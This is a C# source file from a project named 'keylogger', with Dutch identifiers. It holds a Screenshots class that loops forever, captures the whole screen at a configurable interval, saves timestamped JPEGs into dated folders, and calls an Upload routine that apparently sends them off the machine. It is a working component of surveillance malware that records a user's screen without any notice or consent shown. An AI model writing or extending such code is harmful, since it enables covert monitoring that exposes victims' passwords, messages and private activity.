using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;

namespace keylogger
{
    class Screenshots
    {

        #region[screenshots]

        #region[variable]
        public static DateTime datum = DateTime.Now;
        public static decimal hour;
        public static decimal minuten;
        public static decimal seconde;
        public static string folderName = Properties.Settings.Default.screenshotlocatie + "\\keylogger\\screenshot\\";
        public static string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "\\");
        #endregion

        #region [ aantal screenshots]
        public static void Aantalscreenshots()
        {
            for (; ; )
            {
                bool screenshotbool = Properties.Settings.Default.visual_toezicht;
                if (screenshotbool)
                {
                    DateTime TimeNow = DateTime.Now;
                    hour = TimeNow.Hour;
                    minuten = TimeNow.Minute;
                    seconde = TimeNow.Second;
                    Printscreen();
                }
            }
        }

        #endregion

        #region [printscreens]
        private static void Printscreen()
        {

            Screenshotstime();

            Thread.Sleep(scrtimetotaal);
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                
                System.IO.Directory.CreateDirectory(pathString);
                bitmap.Save(pathString + hour + "." + minuten + "." + seconde + ".jpeg", ImageFormat.Jpeg);

                Upload.Screenshotsupload();
            }
        }

        private static int scrtimetotaal;

        private static void Screenshotstime()
        {
            decimal scrminuten = Properties.Settings.Default.minuten * 60000;
            decimal scrseconde = Properties.Settings.Default.seconde * 1000;
            int minuten = Convert.ToInt32(scrminuten);
            int seconde = Convert.ToInt32(scrseconde);

            scrtimetotaal = seconde + minuten;
        }

        #endregion

        #endregion

    }
}
